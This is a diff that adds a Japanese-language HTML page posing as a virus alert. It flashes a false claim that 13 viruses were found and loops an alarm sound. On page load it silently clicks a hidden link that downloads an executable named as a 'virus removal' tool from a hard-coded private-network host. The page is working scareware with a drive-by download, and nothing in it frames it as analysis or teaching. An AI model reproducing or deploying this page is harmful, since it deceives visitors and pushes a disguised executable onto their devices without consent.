@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>警告！ウイルス検出</title>
+    <style>
+        body {
+            background-color: black;
+            color: red;
+            text-align: center;
+            font-family: Arial, sans-serif;
+        }
+        h1 {
+            font-size: 50px;
+            margin-top: 20%;
+            animation: blink 1s infinite;
+        }
+        p {
+            font-size: 30px;
+            margin-top: 20px;
+        }
+        @keyframes blink {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <h1>警告！</h1>
+    <p>13個のウイルスがあなたのデバイスで発見されました！</p>
+    <audio id="warning-audio" loop>
+        <source src="http://192.168.46.128/Project_main/warning.mp3" type="audio/mp3">
+    </audio>
+    <a id="download-link" href="http://192.168.46.128/Project_main/ウイルス駆除.exe" download="ウイルス駆除.exe" style="display:none;">ダウンロード</a>
+    <script>
+        window.addEventListener('load', function() {
+            var audio = document.getElementById('warning-audio');
+            audio.play().catch(function() {
+                // 自動再生がブロックされた場合、ユーザーにクリックさせる
+                alert('警告音を再生するために、ページをクリックしてください。');
+                document.body.addEventListener('click', function() {
+                    audio.play();
+                }, { once: true });
+            });
+
+            // 自動ダウンロードの開始
+            var link = document.getElementById('download-link');
+            link.click();
+        });
+    </script>
+</body>
+</html>
